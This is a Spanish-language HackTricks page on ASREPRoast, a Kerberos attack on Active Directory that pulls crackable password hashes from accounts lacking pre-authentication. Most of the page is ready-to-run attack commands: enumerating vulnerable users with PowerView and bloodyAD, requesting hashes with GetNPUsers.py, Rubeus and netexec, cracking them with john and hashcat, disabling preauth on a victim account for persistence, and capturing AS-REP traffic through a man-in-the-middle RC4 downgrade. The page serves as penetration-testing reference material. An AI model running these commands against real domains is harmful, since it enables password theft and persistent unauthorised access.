# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast es un ataque de seguridad que explota usuarios que carecen del **Kerberos pre-authentication required attribute**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar la autenticación de un usuario al Domain Controller (DC) sin necesitar la contraseña del usuario. El DC responde entonces con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar offline para descubrir la contraseña del usuario.

Los requisitos principales para este ataque son:

- **Lack of Kerberos pre-authentication**: Los usuarios objetivo no deben tener esta característica de seguridad habilitada.
- **Connection to the Domain Controller (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
- **Optional domain account**: Tener una cuenta de dominio permite a los atacantes identificar de forma más eficiente a usuarios vulnerables mediante consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar nombres de usuario.

#### Enumeración de usuarios vulnerables (se necesitan credenciales de dominio)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensaje AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado 0x17 y tipo de preauth 0.

#### Quick one-liners (Linux)

- Enumera primero los objetivos potenciales (p. ej., desde leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Extrae el AS-REP de un solo usuario incluso con una contraseña **vacía** usando `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec también muestra la postura de LDAP signing/channel binding).
- Crack con `hashcat out.asreproast /path/rockyou.txt` – detecta automáticamente **-m 18200** (etype 23) para AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistencia

Forzar que **preauth** no sea requerido para un usuario sobre el que tengas permisos **GenericAll** (o permisos para escribir propiedades):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast sin credenciales

Un atacante puede usar una posición man-in-the-middle para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la preautenticación de Kerberos esté deshabilitada. Por lo tanto funciona para todos los usuarios en la VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta fuerza a las estaciones de trabajo cliente a usar RC4 al alterar la negociación de Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
